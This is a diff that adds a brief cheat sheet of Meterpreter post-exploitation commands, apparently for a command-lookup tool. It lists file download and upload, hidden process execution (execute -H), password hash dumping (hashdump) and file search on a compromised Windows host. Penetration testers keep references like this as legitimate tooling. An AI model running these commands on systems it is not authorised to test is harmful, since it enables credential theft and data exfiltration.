@@ -1,0 +1,19 @@
+% meterpreter
+
+# download
+download <PATH>\\<FILE>
+
+#upload
+upload <FILE> <PATH>\\<FILE>
+
+# edit
+edit <FILE>
+
+# execute [-H hide process] [-f file]
+execute -H -f notepad.exe
+
+# hashdump
+hashdump
+
+# search
+search -f <FILE>*.<EXTENSION> <PATH>\\
